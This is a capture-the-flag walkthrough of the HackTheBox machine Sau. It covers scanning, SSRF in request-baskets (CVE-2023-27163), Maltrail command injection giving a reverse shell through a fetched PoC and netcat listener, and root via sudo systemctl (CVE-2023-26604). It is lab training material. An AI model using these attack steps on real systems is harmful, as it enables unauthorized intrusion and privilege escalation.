---
title: "Sau"
difficulty: Easy
---

# Sau

🔗 [Sau](https://www.hackthebox.com/machines/sau)

<details>

<summary>About</summary>

### Machine Description

`Sau` is an Easy Difficulty Linux machine that features a `Request Baskets` instance that is vulnerable to Server-Side Request Forgery (SSRF) via `[CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)`. Leveraging the vulnerability we are to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.

### Area of Interest

Web Application Injections

### Technology

Request Baskets Maltrail

### Vulnerabilities

OS Command Injection Server Side Request Forgery (SSRF)

### Security Tools

Netcat Nmap

### Languages

Bash

### Techniques

Reconnaissance SUDO Exploitation

### CVE

CVE-2023-26604 CVE-2023-27163

</details>

## Task 0 - Deploy machine

🎯 Target IP: `<YOUR_IP>`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "<YOUR_IP> sau.htb" >> /etc/hosts
</strong>
mkdir -p htb/sau.htb
cd htb/sau.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I like to kick off recon with a ping against the target, which confirms connectivity and gives a hint about the OS.

```bash
ping -c 3 sau.htb
PING sau.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from sau.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=61.0 ms
64 bytes from sau.htb (<YOUR_IP>): icmp_seq=2 ttl=63 time=59.5 ms
64 bytes from sau.htb (<YOUR_IP>): icmp_seq=3 ttl=63 time=60.0 ms
```

From these three ICMP replies the Time To Live (TTL) comes back at \~64 secs, which points to a \*nix host, since Windows boxes typically report a TTL closer to 128 secs.

### 1.1 - Which is the highest open TCP port on the target machine?

```bash
nmap -p0- -sS -Pn -vvv sau.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    filtered http    no-response
8338/tcp  filtered unknown no-response
55555/tcp open     unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

So we end up with 2 open TCP ports: 22, 55555 and 2 filtered TCP ports: 80, 8338.

55555

### 1.2 - What is the name of the open source software that the application on 55555 is "powered by"?

Next, let's fingerprint the services running on the open ports:

```bash
nmap -p22,55555 -sS -Pn -n -v -sCV -T4 sau.htb -oN nmap/service_port_scan
```

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 09 Nov 2024 14:27:59 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sat, 09 Nov 2024 14:27:33 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sat, 09 Nov 2024 14:27:33 GMT
|_    Content-Length: 0
```

Oddly, port 80 shows up as filtered, yet it appears tied to the service listening on port 55555, so let's dig in.

Visiting [`http://sau.htb:55555/web`](http://sau.htb:55555/web) reveals a web app that lets you spin up a basket to capture and review HTTP requests. It's the request-baskets app, version 1.2.1.

```bash
whatweb sau.htb:55555
http://sau.htb:55555 [302 Found] Country[RESERVED][ZZ], IP[<YOUR_IP>], RedirectLocation[/web]
http://sau.htb:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[<YOUR_IP>], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]
```

```bash
gobuster dir -u http://sau.htb:55555 -w /usr/share/wordlists/dirb/common.txt
```

The only directory it turns up is `/web (Status: 200)`, which unfortunately is just our index page.

request-baskets

### 1.3 - What is the version of request-baskets running on Sau?

1.2.1

## Task 2 - Find user flag

### 2.1 -  What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?

A search for 'request-baskets 1.2.1' shows the version is affected by a recent CVE exploitable through an [SSRF](https://portswigger.net/web-security/ssrf) attack.

CVE-2023-27163

Once we've gone over the [PoC](https://github.com/entr0pie/CVE-2023-27163/blob/main/README.md) and its usage notes:

we can grab CVE-2023-27163.sh and run it to exploit the flaw:

```bash
wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
chmod +x CVE-2023-27163.sh
./CVE-2023-27163.sh http://sau.htb:55555 http://sau.htb:80
```

now we append the basket value to our URL and at last reach the filtered port 80: <http://sau.htb:55555/hbvoml>

<br>

maltrail

### 2.2 -  There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path targeted by this exploit?

\
Searching for 'MailTrail v0.53' reveals it's affected by an unauthenticated OS Command Injection (RCE).

The `username` parameter on the **login page** fails to sanitize its input, letting an attacker inject OS commands.

The exploit builds a Base64-encoded reverse shell payload to slip past defenses such as a WAF, IPS or IDS, then ships it to the target URL through a curl command. The payload runs on the target, opening a reverse shell back to the attacker's chosen IP and port.

Attacker machine:

```bash
#first check our IP using ip a
nc -nvlp 4444
```

Target Machine

```bash
python3 exploit.py 10.10.14.6 4444 http://sau.htb:55555/hbvoml
```

/login

### 2.3 -  What user is the Mailtrack application running as on Sau?

A quick bit of system enumeration (whoami and/or id) tells us which user we're running as on the box

puma

### 2.4 - Submit the flag located in the puma user's home directory.

```bash
cd ~
ll
cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

8fa7************************c457

</details>

## Task 3 - Find root flag

### 3.1 - What is the full path to the application the user puma can run as root on Sau?

Nice, now we can move on to privilege escalation to grab the root flag.

Running `sudo -l` shows the commands that user puma is allowed to run with sudo privileges

/usr/bin/systemctl

### 3.2 - What is the full version string for the instance of systemd installed on Sau?

Since systemctl is the control utility for the systemd process, we can check its version with: `systemctl --version`

systemd 245 (245.4-4ubuntu3.22)

### 3.3 - What is the CVE ID for a local privilege escalation vulnerability that affects that particular systemd version?

Searching for 'usr/bin/systemctl status trail.service' surfaces this CVE:

along with this handy resource:&#x20;

then, simply by running: `sudo /usr/bin/systemctl status trail.service`

and typing `!sh`  we can spawn a fresh shell straight away with root privileges.

CVE-2023-26604

### 3.4 - Submit the flag located in the root user's home directory.

Let's head into the root folder and grab the root flag!

<br>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

c4fc************************aea7

</details>

---

# Agent Instructions
This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.

## Querying This Documentation
If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/sau.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
